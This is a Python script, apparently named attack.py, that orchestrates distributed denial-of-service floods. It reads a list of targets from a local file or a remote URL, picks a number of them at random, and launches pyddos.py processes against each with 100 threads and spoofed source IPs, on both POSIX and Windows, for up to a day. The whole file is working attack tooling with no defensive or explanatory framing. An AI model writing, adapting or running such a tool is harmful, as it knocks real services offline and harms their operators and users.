import os
import argparse
import random
import time
import subprocess

import requests


DEFAULT_TARGETS_FILE = 'targets.txt'
TIMEOUT = 86400


if os.name == 'posix':
    import signal

    def interrupted(signum, frame):
        print(f'Timeout reached ({TIMEOUT} seconds)')
        raise Exception

    def wait():
        try:
            signal.alarm(TIMEOUT)
            input()
            signal.alarm(0)
        except:
            pass

    signal.signal(signal.SIGALRM, interrupted)

    def attack(targets):
        processes = [
            subprocess.Popen(
                ['python3', 'pyddos.py', '-T', '100', '-d', target, '--fakeip', '-Request']
            )
            for target in targets
        ]
        time.sleep(1)
        print('Press Enter to stop...')
        wait()
        [p.terminate() for p in processes]
        print('=== Stopped ===')

elif os.name == 'nt':
    import msvcrt

    DETACHED_PROCESS = 0x00000008

    def wait():
        start_time = time.time()
        while True:
            if msvcrt.kbhit():
                inp = msvcrt.getch()
                break
            elif time.time() - start_time > TIMEOUT:
                print(f'Timeout reached ({TIMEOUT} seconds)')
                break
            time.sleep(0.5)

    def attack(targets):
        processes = [
            subprocess.Popen(
                ['python3', 'pyddos.py', '-T', '100', '-d', target, '--fakeip', '-Request'],
                close_fds=True,
                creationflags=DETACHED_PROCESS,
            )
            for target in targets
        ]
        time.sleep(1)
        print('Press Enter to stop...')
        wait()
        [p.terminate() for p in processes]
        print('=== Stopped ===')

else:
    raise Exception('Unsupported OS')


def get_targets(source):
    if source is None or source == '':
        with open(DEFAULT_TARGETS_FILE, 'r') as f:
            targets = f.readlines()
    else:
        result = requests.get(source)
        targets = result.text.splitlines()

    targets = [t.strip() for t in targets if t != '']
    return targets


def select_targets(targets, n):
    return random.sample(targets, n)


def main():
    parser = argparse.ArgumentParser(usage='python3 attack.py -s [source] -n <number of targets>')
    options = parser.add_argument_group('options', '')

    options.add_argument(
        '-s', default=None, help='Target list source URL; if not specified will use targets.txt'
    )
    options.add_argument('-n', type=int, help='Number of targets to attack')

    args = parser.parse_args()
    if args.n is None:
        raise Exception('-n option is mandatory and should be integer')

    n_threads = args.n if args.n > 0 else 1
    targets = select_targets(get_targets(args.s), n_threads)

    attack(targets)


if __name__ == '__main__':
    main()
